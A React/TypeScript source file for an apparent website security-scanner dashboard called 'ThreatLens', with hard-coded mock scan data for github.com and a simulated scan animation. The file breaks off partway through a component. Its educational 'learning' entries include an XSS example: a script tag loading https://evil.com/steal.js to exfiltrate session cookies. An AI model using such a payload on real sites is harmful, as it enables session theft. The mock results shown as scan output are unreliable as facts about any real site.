import React, { useState, useEffect } from "react";
import {
  RadarChart, PolarGrid, PolarAngleAxis, Radar,
  ResponsiveContainer, PieChart, Pie, Cell, BarChart, Bar, XAxis, Tooltip,
} from "recharts";
import {
  Shield, Lock, Globe, Server, Code, FileText, AlertTriangle,
  CheckCircle, XCircle, ChevronDown, ChevronRight, Menu,
  Search, Database, Info, BookOpen, Home, RefreshCw, Zap, Activity,
  Eye,
} from "lucide-react";
const API_URL = "http://127.0.0.1:8000";

/* ─── TYPES ──────────────────────────────────────────────────────────────── */
type Phase = "hero" | "scanning" | "results";
type Section = "overview" | "ssl" | "dns" | "headers" | "cookies" | "tech" | "findings" | "learning";
type Severity = "warning" | "passed" | "info";
type CardStatus = "pass" | "warn" | "info";

/* ─── SCAN STEPS ─────────────────────────────────────────────────────────── */
const SCAN_STEPS = [
  { label: "Initializing ThreatLens Engine",  duration: 480  },
  { label: "Resolving Domain",                duration: 560  },
  { label: "Fetching SSL Certificate",        duration: 820  },
  { label: "Analyzing Security Headers",      duration: 680  },
  { label: "Inspecting Cookies",              duration: 480  },
  { label: "Collecting DNS Intelligence",     duration: 920  },
  { label: "Fingerprinting Technologies",     duration: 1100 },
  { label: "Analyzing HTTP Methods",          duration: 380  },
  { label: "Parsing robots.txt",              duration: 280  },
  { label: "Calculating Risk Score",          duration: 780  },
];

/* ─── SIDEBAR NAV ────────────────────────────────────────────────────────── */
const NAV = [
  { id: "overview" as Section,  label: "Overview",    Icon: Home          },
  { id: "ssl"      as Section,  label: "SSL / TLS",   Icon: Lock          },
  { id: "dns"      as Section,  label: "DNS",         Icon: Globe         },
  { id: "headers"  as Section,  label: "Headers",     Icon: Shield        },
  { id: "cookies"  as Section,  label: "Cookies",     Icon: Database      },
  { id: "tech"     as Section,  label: "Technology",  Icon: Code          },
  { id: "findings" as Section,  label: "Findings",    Icon: AlertTriangle },
  { id: "learning" as Section,  label: "Learning",    Icon: BookOpen      },
];

/* ─── BACKGROUND NODES (deterministic) ──────────────────────────────────── */
const NODES = Array.from({ length: 24 }, (_, i) => ({
  x: ((i * 41 + 13) % 94) + 3,
  y: ((i * 37 + 7)  % 88) + 6,
  dur: 8 + (i % 5) * 2,
  del: (i * 0.73) % 5,
  color: i % 3 === 0 ? "#06b6d4" : i % 3 === 1 ? "#3b82f6" : "#10b981",
}));

const EDGES: { x1: number; y1: number; x2: number; y2: number }[] = (() => {
  const out: { x1: number; y1: number; x2: number; y2: number }[] = [];
  for (let i = 0; i < NODES.length; i++) {
    for (let j = i + 1; j < NODES.length; j++) {
      const dx = NODES[i].x - NODES[j].x;
      const dy = NODES[i].y - NODES[j].y;
      if (Math.sqrt(dx * dx + dy * dy) < 20) {
        out.push({ x1: NODES[i].x, y1: NODES[i].y, x2: NODES[j].x, y2: NODES[j].y });
      }
    }
  }
  return out;
})();

/* ─── MOCK DATA ──────────────────────────────────────────────────────────── */
const D = {
  score: 87,
  grade: "A+",
  risk: "Low Risk",
  confidence: "High Confidence",

  ssl: {
    grade: "A+", valid: true,
    issuer: "DigiCert Global G2 TLS RSA SHA256 2020 CA1",
    subject: "*.github.com",
    serial: "08:3B:E0:56:90:42:46:B1:A1:75:6A:C9:59:91:C7:4A",
    expires: "Sep 30, 2025",
    daysLeft: 271,
    protocol: "TLS 1.3",
    cipher: "TLS_AES_256_GCM_SHA384",
    bits: 256,
    transparency: true,
    ocsp: "OCSP Stapling Active",
    hsts: true,
  },

  dns: [
    { type: "A",    value: "192.30.255.113",                     ttl: "60s"     },
    { type: "A",    value: "192.30.255.112",                     ttl: "60s"     },
    { type: "AAAA", value: "2606:50c0:8000::153",                ttl: "60s"     },
    { type: "MX",   value: "10 aspmx.l.google.com",             ttl: "3600s"   },
    { type: "TXT",  value: "v=spf1 include:_spf.google.com ~all",ttl: "3600s"  },
    { type: "NS",   value: "ns-1707.awsdns-21.co.uk",           ttl: "172800s" },
    { type: "CAA",  value: "0 issue \"digicert.com\"",          ttl: "3600s"   },
  ],

  headers: [
    { name: "Strict-Transport-Security",   present: true,  value: "max-age=31536000; includeSubDomains; preload" },
    { name: "Content-Security-Policy",     present: true,  value: "default-src 'self'; script-src 'self'" },
    { name: "X-Frame-Options",             present: false, value: null },
    { name: "X-Content-Type-Options",      present: true,  value: "nosniff" },
    { name: "Referrer-Policy",             present: true,  value: "strict-origin-when-cross-origin" },
    { name: "Permissions-Policy",          present: false, value: null },
    { name: "X-XSS-Protection",            present: true,  value: "1; mode=block" },
    { name: "Cross-Origin-Opener-Policy",  present: true,  value: "same-origin" },
  ],

  cookies: [
    { name: "_gh_sess",     secure: true,  httpOnly: true,  sameSite: "Lax",  path: "/" },
    { name: "user_session", secure: true,  httpOnly: true,  sameSite: null,   path: "/" },
    { name: "_octo",        secure: true,  httpOnly: false, sameSite: "Lax",  path: "/" },
  ],

  technologies: [
    { name: "React",          category: "Frontend",  risk: "low"  },
    { name: "Ruby on Rails",  category: "Backend",   risk: "low"  },
    { name: "Nginx",          category: "Server",    risk: "low"  },
    { name: "Cloudflare",     category: "CDN / WAF", risk: "low"  },
    { name: "GitHub Actions", category: "CI / CD",   risk: "low"  },
    { name: "MySQL",          category: "Database",  risk: "low"  },
    { name: "Redis",          category: "Cache",     risk: "low"  },
    { name: "Bootstrap",      category: "CSS",       risk: "low"  },
    { name: "Go",             category: "Backend",   risk: "low"  },
    { name: "AWS S3",         category: "Storage",   risk: "low"  },
  ],

  findings: [
    { severity: "warning" as Severity, title: "X-Frame-Options Header Missing",    desc: "The X-Frame-Options header is absent, leaving the site exposed to clickjacking attacks where attackers embed the page in a transparent iframe over a decoy site." },
    { severity: "warning" as Severity, title: "Cookie Missing SameSite Attribute", desc: "The user_session cookie lacks a SameSite attribute, increasing the CSRF attack surface when users visit third-party websites." },
    { severity: "warning" as Severity, title: "Permissions-Policy Header Absent",  desc: "Without a Permissions-Policy header, browsers may grant unrestricted access to powerful features like camera, microphone, and geolocation to third-party scripts." },
    { severity: "passed"  as Severity, title: "HTTPS Enforced Globally",           desc: "All HTTP traffic is automatically redirected to HTTPS with HSTS preloading enabled, preventing protocol downgrade attacks." },
    { severity: "passed"  as Severity, title: "TLS 1.3 Protocol in Use",          desc: "Modern cipher suites with perfect forward secrecy via AES-256-GCM and automatic key rotation — no deprecated TLS 1.0/1.1 fallbacks." },
    { severity: "passed"  as Severity, title: "DNSSEC Validation Active",         desc: "DNS records are cryptographically signed and validated, blocking DNS spoofing and cache poisoning attacks." },
    { severity: "passed"  as Severity, title: "Content Security Policy Present",   desc: "A CSP header restricts which resources can be loaded, significantly reducing the risk of cross-site scripting attacks." },
    { severity: "passed"  as Severity, title: "robots.txt Properly Configured",   desc: "Crawl rules are present and correctly structured, preventing sensitive paths from being indexed by search engines." },
    { severity: "info"    as Severity, title: "security.txt Not Found",            desc: "A /.well-known/security.txt file provides a responsible disclosure channel for security researchers to report vulnerabilities." },
  ],

  radar: [
    { subject: "SSL/TLS",    value: 95 },
    { subject: "DNS",        value: 78 },
    { subject: "Headers",    value: 72 },
    { subject: "Cookies",    value: 68 },
    { subject: "Stack",      value: 85 },
    { subject: "Disclosure", value: 55 },
  ],

  donut: [
    { name: "Passed",   value: 5, color: "#10b981" },
    { name: "Warnings", value: 3, color: "#f59e0b" },
    { name: "Info",     value: 1, color: "#3b82f6" },
  ],

  modules: [
    { id: "ssl"      as Section, label: "SSL Certificate",  Icon: Lock,         status: "pass" as CardStatus, metric: "TLS 1.3 · Grade A+",  score: 95 },
    { id: "dns"      as Section, label: "DNS Security",     Icon: Globe,        status: "pass" as CardStatus, metric: "7 records · DNSSEC",   score: 78 },
    { id: "headers"  as Section, label: "Security Headers", Icon: Shield,       status: "warn" as CardStatus, metric: "6 / 8 present",        score: 72 },
    { id: "cookies"  as Section, label: "Cookie Security",  Icon: Database,     status: "warn" as CardStatus, metric: "3 cookies · 1 issue",  score: 68 },
    { id: "tech"     as Section, label: "Technology Stack", Icon: Code,         status: "pass" as CardStatus, metric: "10 detected",          score: 85 },
    { id: "findings" as Section, label: "HTTP Methods",     Icon: Server,       status: "pass" as CardStatus, metric: "GET · POST only",      score: 90 },
    { id: "findings" as Section, label: "robots.txt",       Icon: FileText,     status: "pass" as CardStatus, metric: "Present · Configured", score: 100 },
    { id: "findings" as Section, label: "security.txt",     Icon: Eye,          status: "info" as CardStatus, metric: "Not found",            score: 40  },
  ],

  learning: [
    {
      title: "Content Security Policy (CSP)",
      severity: "high",
      what: "CSP is an HTTP response header that restricts which resources the browser can load — scripts, styles, fonts, and media.",
      why: "Without CSP, a single XSS flaw lets attackers inject and execute arbitrary scripts, stealing session tokens and sensitive user data.",
      example: "An attacker exploits an XSS vulnerability in a comment field and injects <script src='https://evil.com/steal.js'></script> to exfiltrate session cookies to a remote server.",
      prevention: "Add Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' to restrict untrusted script execution.",
    },
    {
      title: "Clickjacking via X-Frame-Options",
      severity: "medium",
      what: "X-Frame-Options prevents your site from being embedded in iframes by third-party domains, protecting against UI redressing attacks.",
      why: "Attackers overlay a transparent iframe of your site on a decoy page, tricking users into clicking hidden buttons like 'Transfer Funds'.",
      example: "A malicious gaming site places your bank's 'Confirm Transfer' button beneath an invisible iframe, making users unknowingly authorize transactions.",
      prevention: "Add X-Frame-Options: DENY to all responses, or use Content-Security-Policy: frame-ancestors 'none' for fine-grained control.",
    },
    {
      title: "CSRF via SameSite Cookie Attribute",
      severity: "medium",
      what: "SameSite controls whether cookies are sent with cross-origin requests — your primary defense against Cross-Site Request Forgery.",
      why: "Without SameSite, attacker-controlled sites can make authenticated requests to your app using the victim's session cookies.",
      example: "Visiting evil.com triggers a hidden POST to your banking app. Since cookies are attached, the server sees a valid authenticated request and executes the transfer.",
      prevention: "Set SameSite=Strict on all session cookies. Combine with server-side CSRF tokens for defense-in-depth on sensitive operations.",
    },
  ],
};

/* ─── CSS ────────────────────────────────────────────────────────────────── */
const STYLES = `
  @keyframes tl-float {
    0%, 100% { transform: translateY(0px) translateX(0px); opacity: 0.4; }
    33%       { transform: translateY(-14px) translateX(8px); opacity: 0.7; }
    66%       { transform: translateY(8px) translateX(-5px); opacity: 0.5; }
  }
  @keyframes tl-node-pulse {
    0%, 100% { opacity: 0.25; }
    50%       { opacity: 0.9; }
  }
  @keyframes tl-slide-up {
    from { opacity: 0; transform: translateY(20px); }
    to   { opacity: 1; transform: translateY(0); }
  }
  @keyframes tl-fade-in {
    from { opacity: 0; }
    to   { opacity: 1; }
  }
  @keyframes tl-scan-blink {
    0%, 100% { opacity: 1; }
    50%       { opacity: 0; }
  }
  @keyframes tl-grid-breathe {
    0%, 100% { opacity: 0.5; }
    50%       { opacity: 0.85; }
  }
  @keyframes tl-score-pulse {
    0%, 70% { filter: none; }
    85%      { filter: drop-shadow(0 0 18px rgba(16,185,129,0.9)); }
    100%     { filter: drop-shadow(0 0 6px rgba(16,185,129,0.4)); }
  }
  @keyframes tl-warn-glow {
    0%, 100% { box-shadow: none; }
    50%       { box-shadow: 0 0 0 3px rgba(245,158,11,0.15); }
  }
  @keyframes tl-scanline {
    0%   { top: -4px; }
    100% { top: 100%; }
  }

  .tl-glass {
    background: rgba(10, 20, 45, 0.55);
    backdrop-filter: blur(24px);
    -webkit-backdrop-filter: blur(24px);
    border: 1px solid rgba(6, 182, 212, 0.12);
    border-radius: 16px;
    transition: border-color 0.2s ease, background 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
  }
  .tl-glass:hover {
    border-color: rgba(6, 182, 212, 0.26);
    background: rgba(10, 25, 55, 0.65);
    transform: translateY(-2px);
    box-shadow: 0 8px 32px rgba(6, 182, 212, 0.07);
  }
  .tl-glass-static {
    background: rgba(10, 20, 45, 0.55);
    backdrop-filter: blur(24px);
    -webkit-backdrop-filter: blur(24px);
    border: 1px solid rgba(6, 182, 212, 0.12);
    border-radius: 16px;
  }
  .tl-glow-btn {
    transition: box-shadow 0.2s ease, transform 0.15s ease, background 0.2s ease;
  }
  .tl-glow-btn:hover {
    box-shadow: 0 0 28px rgba(6,182,212,0.5), 0 0 56px rgba(6,182,212,0.18), inset 0 0 16px rgba(6,182,212,0.08);
    transform: scale(1.02);
  }
  .tl-glow-btn:active { transform: scale(0.98); }

  .tl-nav-item {
    border-left: 2px solid transparent;
    transition: all 0.15s ease;
    cursor: pointer;
  }
  .tl-nav-item:hover {
    background: rgba(6,182,212,0.06);
    border-left-color: rgba(6,182,212,0.3);
    color: #94a3b8;
  }
  .tl-nav-active {
    background: linear-gradient(90deg, rgba(6,182,212,0.14) 0%, transparent 100%);
    border-left: 2px solid #06b6d4 !important;
    color: #06b6d4 !important;
  }

  .tl-search {
    background: rgba(10, 20, 45, 0.65);
    border: 1px solid rgba(6, 182, 212, 0.18);
    border-radius: 12px;
    color: #e2e8f0;
    outline: none;
    transition: border-color 0.2s ease, box-shadow 0.2s ease;
    font-family: 'JetBrains Mono', monospace;
  }
  .tl-search:focus {
    border-color: rgba(6, 182, 212, 0.55);
    box-shadow: 0 0 0 3px rgba(6,182,212,0.1), 0 0 22px rgba(6,182,212,0.12);
  }
  .tl-search::placeholder { color: #334155; }

  .tl-pill {
    display: inline-flex; align-items: center;
    padding: 4px 12px; border-radius: 999px;
    font-size: 12px; font-weight: 500;
    font-family: 'JetBrains Mono', monospace;
    transition: transform 0.15s ease, box-shadow 0.15s ease;
  }
  .tl-pill:hover { transform: scale(1.06); }

  .tl-table-row:hover { background: rgba(6,182,212,0.035); }
  .tl-table-row { transition: background 0.15s ease; }

  .tl-card-enter { animation: tl-slide-up 0.45s ease forwards; opacity: 0; }
  .tl-fade-enter  { animation: tl-fade-in  0.35s ease forwards; opacity: 0; }

  .tl-warn-badge { animation: tl-warn-glow 2s ease-in-out infinite; }

  ::-webkit-scrollbar { width: 4px; height: 4px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: rgba(6,182,212,0.18); border-radius: 2px; }
  * { box-sizing: border-box; }
`;

/* ─── HERO PAGE ──────────────────────────────────────────────────────────── */
function HeroPage({ onAnalyze }: { onAnalyze: (t: string) => void }) {
  const [input, setInput] = useState("");

  const go = () => onAnalyze(input.trim() || "github.com");

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center overflow-hidden" style={{ background: "#030712", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
      {/* Animated background */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute inset-0" style={{
          backgroundImage: "linear-gradient(rgba(6,182,212,0.04) 1px, transparent 1px), linear-gradient(90deg, rgba(6,182,212,0.04) 1px, transparent 1px)",
          backgroundSize: "80px 80px",
          animation: "tl-grid-breathe 9s ease-in-out infinite",
        }} />
        <div className="absolute" style={{ top: "12%", left: "18%", width: "520px", height: "520px", background: "radial-gradient(circle, rgba(6,182,212,0.07) 0%, transparent 70%)", filter: "blur(70px)", animation: "tl-float 14s ease-in-out infinite" }} />
        <div className="absolute" style={{ bottom: "14%", right: "12%", width: "640px", height: "640px", background: "radial-gradient(circle, rgba(59,130,246,0.06) 0%, transparent 70%)", filter: "blur(80px)", animation: "tl-float 18s 5s ease-in-out infinite" }} />
        <div className="absolute" style={{ top: "48%", right: "28%", width: "360px", height: "360px", background: "radial-gradient(circle, rgba(16,185,129,0.05) 0%, transparent 70%)", filter: "blur(60px)", animation: "tl-float 11s 9s ease-in-out infinite" }} />

        {/* SVG network */}
        <svg className="absolute inset-0 w-full h-full" viewBox="0 0 100 100" preserveAspectRatio="none" style={{ opacity: 0.38 }}>
          {EDGES.map((e, i) => (
            <line key={i} x1={e.x1} y1={e.y1} x2={e.x2} y2={e.y2} stroke="rgba(6,182,212,0.45)" strokeWidth="0.12" />
          ))}
          {NODES.map((n, i) => (
            <circle key={i} cx={n.x} cy={n.y} r="0.55" fill={n.color} style={{ animation: `tl-node-pulse ${n.dur}s ${n.del}s ease-in-out infinite` }} />
          ))}
        </svg>

        {/* Floating particles */}
        {NODES.map((n, i) => (
          <div key={`p${i}`} className="absolute rounded-full" style={{
            left: `${(n.x + 5.3) % 98}%`, top: `${(n.y + 8.7) % 96}%`,
            width: i % 5 === 0 ? "3px" : "2px", height: i % 5 === 0 ? "3px" : "2px",
            background: n.color, opacity: 0.45,
            animation: `tl-float ${n.dur + 2}s ${n.del + 1.2}s ease-in-out infinite`,
          }} />
        ))}
      </div>

      {/* Content */}
      <div className="relative z-10 flex flex-col items-center text-center px-6 w-full max-w-2xl" style={{ animation: "tl-fade-in 0.9s ease forwards" }}>
        {/* Logo */}
        <div className="flex items-center gap-3 mb-10">
          <div className="relative">
            <div className="w-11 h-11 rounded-xl flex items-center justify-center" style={{ background: "linear-gradient(135deg, rgba(6,182,212,0.18), rgba(59,130,246,0.18))", border: "1px solid rgba(6,182,212,0.28)" }}>
              <Shield size={22} style={{ color: "#06b6d4" }} />
            </div>
            <div className="absolute inset-0 rounded-xl" style={{ background: "rgba(6,182,212,0.12)", filter: "blur(10px)", animation: "tl-node-pulse 3s ease-in-out infinite" }} />
          </div>
          <div className="text-left">
            <div className="font-extrabold text-lg tracking-tight" style={{ color: "#e2e8f0", letterSpacing: "-0.3px" }}>ThreatLens</div>
            <div className="text-xs" style={{ color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace", letterSpacing: "2px" }}>SECURITY INTELLIGENCE</div>
          </div>
        </div>

        {/* Headline */}
        <h1 className="font-extrabold mb-4 leading-tight" style={{
          fontSize: "clamp(2rem, 5vw, 3.4rem)",
          background: "linear-gradient(140deg, #e2e8f0 25%, #06b6d4 60%, #3b82f6 90%)",
          WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent", backgroundClip: "text",
          letterSpacing: "-0.025em",
        }}>
          Cyber Risk Intelligence<br />at Your Fingertips
        </h1>
        <p className="mb-10 max-w-lg" style={{ fontSize: "1.05rem", color: "#64748b", lineHeight: "1.75" }}>
          Instant, deep security assessment for any domain — SSL, DNS, headers, cookies, and risk intelligence in seconds.
        </p>

        {/* Search */}
        <div className="w-full max-w-xl mb-4">
          <div className="flex gap-3">
            <div className="flex-1 relative">
              <Search size={16} className="absolute left-4 top-1/2 -translate-y-1/2" style={{ color: "#334155" }} />
              <input
                className="tl-search w-full pl-10 pr-4 py-4 text-sm"
                placeholder="github.com · https://example.com · password123"
                value={input}
                onChange={e => setInput(e.target.value)}
                onKeyDown={e => e.key === "Enter" && go()}
              />
            </div>
            <button onClick={go} className="tl-glow-btn flex items-center gap-2 px-7 py-4 rounded-xl font-bold text-sm" style={{ background: "linear-gradient(135deg, #06b6d4, #3b82f6)", color: "#030712", border: "1px solid rgba(6,182,212,0.35)", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
              <Zap size={15} />
              Analyze
            </button>
          </div>
        </div>

        {/* Quick targets */}
        <div className="flex items-center gap-2 flex-wrap justify-center mb-12">
          <span className="text-xs" style={{ color: "#1e3a5f" }}>Try:</span>
          {["github.com", "stripe.com", "cloudflare.com"].map(ex => (
            <button key={ex} onClick={() => setInput(ex)} className="text-xs px-3 py-1 rounded-lg transition-all duration-150 hover:border-cyan-500/30" style={{ color: "#475569", background: "rgba(6,182,212,0.04)", border: "1px solid rgba(6,182,212,0.1)", fontFamily: "'JetBrains Mono', monospace" }}>
              {ex}
            </button>
          ))}
        </div>

        {/* Feature tags */}
        <div className="flex items-center gap-6 flex-wrap justify-center">
          {[
            { Icon: Lock,          label: "SSL / TLS Analysis" },
            { Icon: Shield,        label: "Header Security Audit" },
            { Icon: Globe,         label: "DNS Intelligence" },
            { Icon: Activity,      label: "Automated Risk Scoring" },
          ].map(({ Icon, label }) => (
            <div key={label} className="flex items-center gap-2">
              <Icon size={13} style={{ color: "#06b6d4" }} />
              <span className="text-xs" style={{ color: "#334155" }}>{label}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

/* ─── SCAN TERMINAL ──────────────────────────────────────────────────────── */
function ScanTerminal({ target, step }: { target: string; step: number }) {
  const done = step >= SCAN_STEPS.length;
  const progress = step < 0 ? 0 : done ? 100 : Math.round(((step + 1) / SCAN_STEPS.length) * 100);
  const filled = Math.round(progress / 5);

  return (
    <div className="min-h-screen flex items-center justify-center" style={{ background: "#030712" }}>
      <div className="absolute inset-0" style={{ background: "radial-gradient(ellipse at center, rgba(6,182,212,0.05) 0%, transparent 60%)" }} />

      <div className="relative" style={{ width: "min(540px, 94vw)", animation: "tl-fade-in 0.4s ease forwards" }}>
        {/* Terminal window */}
        <div style={{ background: "rgba(6, 12, 26, 0.97)", border: "1px solid rgba(6,182,212,0.22)", borderRadius: "14px", overflow: "hidden", boxShadow: "0 0 60px rgba(6,182,212,0.1), 0 0 120px rgba(6,182,212,0.04)" }}>
          {/* Title bar */}
          <div className="flex items-center gap-2 px-4 py-3" style={{ background: "rgba(6,182,212,0.05)", borderBottom: "1px solid rgba(6,182,212,0.1)" }}>
            <div className="w-3 h-3 rounded-full" style={{ background: "#ef4444" }} />
            <div className="w-3 h-3 rounded-full" style={{ background: "#f59e0b" }} />
            <div className="w-3 h-3 rounded-full" style={{ background: "#10b981" }} />
            <span className="ml-3 text-xs" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>
              threatlens — scan engine v2.1.0
            </span>
          </div>

          {/* Body */}
          <div className="p-6" style={{ fontFamily: "'JetBrains Mono', monospace", fontSize: "13px", lineHeight: "1.85", color: "#64748b" }}>
            {/* ASCII header */}
            <div className="text-center mb-5">
              <div style={{ color: "#1e3a5f", fontSize: "11px" }}>╔══════════════════════════════════════════╗</div>
              <div style={{ color: "#1e3a5f", fontSize: "11px" }} className="flex justify-center items-center">
                ║&nbsp;&nbsp;
                <span style={{ color: "#06b6d4", letterSpacing: "3px", fontWeight: "700" }}>⚡ THREATLENS ENGINE</span>
                &nbsp;&nbsp;║
              </div>
              <div style={{ color: "#1e3a5f", fontSize: "11px" }}>╚══════════════════════════════════════════╝</div>
            </div>

            {/* Target */}
            <div className="mb-4">
              <span style={{ color: "#1e3a5f" }}>Target&nbsp;&nbsp;&nbsp;</span>
              <span style={{ color: "#e2e8f0" }}>{target}</span>
            </div>

            {/* Progress */}
            <div className="mb-5">
              <div className="flex justify-between mb-1" style={{ fontSize: "11px" }}>
                <span style={{ color: "#1e3a5f" }}>Progress</span>
                <span style={{ color: done ? "#10b981" : "#06b6d4" }}>{progress}%</span>
              </div>
              <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "4px", height: "5px", overflow: "hidden" }}>
                <div style={{ background: done ? "linear-gradient(90deg, #10b981, #06b6d4)" : "linear-gradient(90deg, #06b6d4, #3b82f6)", height: "100%", width: `${progress}%`, borderRadius: "4px", transition: "width 0.45s ease", boxShadow: "0 0 8px rgba(6,182,212,0.5)" }} />
              </div>
              <div style={{ color: "#1e293b", marginTop: "4px", fontSize: "11px", userSelect: "none" }}>
                {"█".repeat(filled)}{"░".repeat(20 - filled)}&nbsp;
              </div>
            </div>

            {/* Steps */}
            <div style={{ display: "flex", flexDirection: "column", gap: "3px" }}>
              {SCAN_STEPS.map((s, i) => {
                const past    = i < step;
                const current = i === step && !done;
                const future  = i > step;
                return (
                  <div key={i} className="flex items-center gap-3 text-xs" style={{ opacity: future ? 0.25 : 1, transition: "opacity 0.35s ease" }}>
                    <span style={{ width: "14px", display: "inline-block", textAlign: "center" }}>
                      {past    && <span style={{ color: "#10b981" }}>✓</span>}
                      {current && <span style={{ color: "#06b6d4", animation: "tl-scan-blink 0.75s ease-in-out infinite" }}>⟳</span>}
                      {future  && <span style={{ color: "#1e293b" }}>·</span>}
                    </span>
                    <span style={{ color: past ? "#10b981" : current ? "#e2e8f0" : "#1e293b", transition: "color 0.3s ease" }}>
                      {s.label}{current ? "..." : ""}
                    </span>
                  </div>
                );
              })}
              {done && (
                <div className="flex items-center gap-3 mt-2" style={{ animation: "tl-slide-up 0.4s ease forwards", opacity: 0 }}>
                  <span style={{ color: "#10b981" }}>✓</span>
                  <span style={{ color: "#10b981", fontWeight: "700", letterSpacing: "1px" }}>SCAN COMPLETE — Rendering results...</span>
                </div>
              )}
            </div>

            {/* Cursor */}
            {!done && (
              <div className="mt-4 flex items-center gap-1">
                <span style={{ color: "#1e3a5f" }}>$</span>
                <span style={{ color: "#06b6d4", animation: "tl-scan-blink 1s ease-in-out infinite" }}>▊</span>
              </div>
            )}
          </div>
        </div>

        {/* Scanline */}
        <div className="absolute inset-0 pointer-events-none overflow-hidden rounded-xl">
          <div style={{ position: "absolute", width: "100%", height: "2px", background: "linear-gradient(90deg, transparent, rgba(6,182,212,0.25), transparent)", animation: "tl-scanline 4s linear infinite" }} />
        </div>
      </div>
    </div>
  );
}

/* ─── SCORE RING ─────────────────────────────────────────────────────────── */
function ScoreRing({ display, final }: { display: number; final: number }) {
  const r = 72;
  const circ = 2 * Math.PI * r;
  const done = display >= final;
  const color = display >= 85 ? "#10b981" : display >= 65 ? "#06b6d4" : display >= 45 ? "#f59e0b" : "#ef4444";
  const offset = circ * (1 - display / 100);

  return (
    <div className="relative" style={{ width: 176, height: 176, animation: done ? "tl-score-pulse 1.8s ease forwards" : "none" }}>
      <svg width="176" height="176" style={{ transform: "rotate(-90deg)" }}>
        <circle cx="88" cy="88" r={r} fill="none" stroke="rgba(255,255,255,0.04)" strokeWidth="10" />
        <circle cx="88" cy="88" r={r} fill="none" stroke={color} strokeWidth="10" strokeLinecap="round"
          strokeDasharray={circ} strokeDashoffset={offset}
          style={{ transition: "stroke-dashoffset 0.04s linear, stroke 0.6s ease", filter: `drop-shadow(0 0 7px ${color})` }}
        />
        <circle cx="88" cy="88" r={r} fill="none" stroke={color} strokeWidth="20" strokeLinecap="round"
          strokeDasharray={circ} strokeDashoffset={offset}
          style={{ opacity: 0.07, transition: "stroke-dashoffset 0.04s linear" }}
        />
      </svg>
      <div className="absolute inset-0 flex flex-col items-center justify-center" style={{ fontFamily: "'Plus Jakarta Sans', sans-serif" }}>
        <span className="font-extrabold" style={{ fontSize: "40px", color, lineHeight: 1, letterSpacing: "-2px" }}>{display}</span>
        <span className="text-xs mt-1" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>/ 100</span>
      </div>
    </div>
  );
}

/* ─── STATUS BADGE ───────────────────────────────────────────────────────── */
function StatusBadge({ status }: { status: CardStatus }) {
  const cfg = {
    pass: { label: "PASS", color: "#10b981" },
    warn: { label: "WARN", color: "#f59e0b" },
    info: { label: "INFO", color: "#3b82f6" },
  }[status];
  return (
    <span className="tl-pill text-xs" style={{ background: `${cfg.color}14`, color: cfg.color, border: `1px solid ${cfg.color}28` }}>
      {cfg.label}
    </span>
  );
}

/* ─── SECTION: OVERVIEW ──────────────────────────────────────────────────── */
function OverviewSection({ score, cardCount, setSection }: { score: number; cardCount: number; setSection: (s: Section) => void }) {
  const scoreColor = score >= 85 ? "#10b981" : score >= 65 ? "#06b6d4" : score >= 45 ? "#f59e0b" : "#ef4444";

  return (
    <div className="space-y-5 tl-fade-enter">
      {/* Hero row */}
      <div className="grid gap-4" style={{ gridTemplateColumns: "auto 1fr" }}>
        {/* Score ring */}
        <div className="tl-glass p-6 flex flex-col items-center justify-center" style={{ minWidth: "210px" }}>
          <ScoreRing display={score} final={D.score} />
          <div className="mt-4 text-center">
            <div className="font-extrabold text-2xl" style={{ color: scoreColor, letterSpacing: "-0.5px", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{D.grade}</div>
            <div className="text-sm font-medium mt-0.5" style={{ color: "#94a3b8" }}>{D.risk}</div>
            <div className="text-xs mt-0.5" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>{D.confidence}</div>
          </div>
        </div>

        {/* Right column: stats + donut */}
        <div className="grid gap-4" style={{ gridTemplateColumns: "1fr 1fr" }}>
          {/* Stats */}
          <div className="tl-glass p-5">
            <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>SCAN SUMMARY</div>
            <div className="space-y-3">
              {[
                { label: "Total Checks",  value: "34",              color: "#94a3b8" },
                { label: "Passed",        value: "26",              color: "#10b981" },
                { label: "Warnings",      value: "6",               color: "#f59e0b" },
                { label: "Critical",      value: "2",               color: "#ef4444" },
                { label: "Risk Score",    value: `${score} / 100`,  color: scoreColor },
              ].map(({ label, value, color }) => (
                <div key={label} className="flex items-center justify-between">
                  <span className="text-xs" style={{ color: "#475569" }}>{label}</span>
                  <span className="font-bold text-sm" style={{ color, fontFamily: "'JetBrains Mono', monospace" }}>{value}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Donut */}
          <div className="tl-glass p-5">
            <div className="text-xs font-bold mb-1" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>RISK DISTRIBUTION</div>
            <ResponsiveContainer width="100%" height={130}>
              <PieChart>
                <Pie data={D.donut} cx="50%" cy="50%" innerRadius={38} outerRadius={56} paddingAngle={3} dataKey="value" animationBegin={400} animationDuration={1200}>
                  {D.donut.map((entry, i) => <Cell key={i} fill={entry.color} />)}
                </Pie>
                <Tooltip contentStyle={{ background: "#080f1e", border: "1px solid rgba(6,182,212,0.18)", borderRadius: "8px", fontSize: "12px", fontFamily: "'JetBrains Mono', monospace" }} />
              </PieChart>
            </ResponsiveContainer>
            <div className="flex justify-center gap-3">
              {D.donut.map(d => (
                <div key={d.name} className="flex items-center gap-1.5">
                  <div className="w-2 h-2 rounded-full" style={{ background: d.color }} />
                  <span className="text-xs" style={{ color: "#475569" }}>{d.name}</span>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>

      {/* Radar */}
      <div className="tl-glass p-5">
